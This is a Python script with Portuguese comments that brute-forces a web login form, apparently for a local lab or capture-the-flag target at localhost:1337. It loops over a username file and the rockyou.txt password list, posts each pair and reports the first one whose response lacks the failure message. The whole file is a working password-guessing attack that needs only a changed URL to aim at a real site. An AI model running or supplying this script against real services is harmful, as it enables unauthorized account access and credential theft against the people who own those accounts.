# Importa a biblioteca necessária para fazer requisições web
import requests
import sys

# --- CONFIGURAÇÕES ---
# A URL do alvo onde o formulário de login é enviado
URL = "http://localhost:1337/login"
# O nome do arquivo com a lista de nomes de usuário
ARQUIVO_USUARIOS = "nicks.txt"
# O nome do arquivo com a lista de senhas
ARQUIVO_SENHAS = "rockyou.txt"
# Mensagem que aparece na página quando o login FALHA.
# IMPORTANTE: Verifique na página qual é a mensagem de erro exata e ajuste se necessário.
MENSAGEM_FALHA = "Invalid credentials."

# --- LÓGICA DO SCRIPT ---

print("[*] Iniciando o script de força bruta...")

try:
    # Tenta abrir e ler a lista de usuários
    with open(ARQUIVO_USUARIOS, 'r') as f:
        usuarios = [linha.strip() for linha in f]
    print(f"[*] {len(usuarios)} usuários carregados de {ARQUIVO_USUARIOS}")

    # Tenta abrir e ler a lista de senhas
    with open(ARQUIVO_SENHAS, 'r') as f:
        senhas = [linha.strip() for linha in f]
    print(f"[*] {len(senhas)} senhas carregadas de {ARQUIVO_SENHAS}")

except FileNotFoundError as e:
    print(f"[!] Erro: Arquivo não encontrado - {e.filename}. Certifique-se de que o script está na mesma pasta que os arquivos .txt.")
    sys.exit(1)


# Itera sobre cada usuário na lista
for usuario in usuarios:
    # Itera sobre cada senha na lista
    for senha in senhas:
        # Monta o payload (dados a serem enviados) com o usuário e a senha atuais
        payload = {
            'username': usuario,
            'password': senha
        }

        try:
            # Envia a requisição POST para a URL de login
            resposta = requests.post(URL, data=payload)

            # Verifica se a mensagem de falha NÃO está no conteúdo da resposta
            # Se a mensagem de erro não estiver lá, assumimos que o login foi bem-sucedido
            if MENSAGEM_FALHA not in resposta.text:
                print("\n" + "="*40)
                print(f"[+] SUCESSO! Credenciais encontradas!")
                print(f"[+] Usuário: {usuario}")
                print(f"[+] Senha: {senha}")
                print("="*40)
                # Encerra o script após encontrar o sucesso
                sys.exit(0)

        except requests.exceptions.ConnectionError:
            print(f"[!] Erro de conexão. A aplicação em {URL} está rodando?")
            sys.exit(1)

# Se os loops terminarem sem sucesso
print("\n[!] Nenhuma credencial válida foi encontrada nas listas fornecidas.")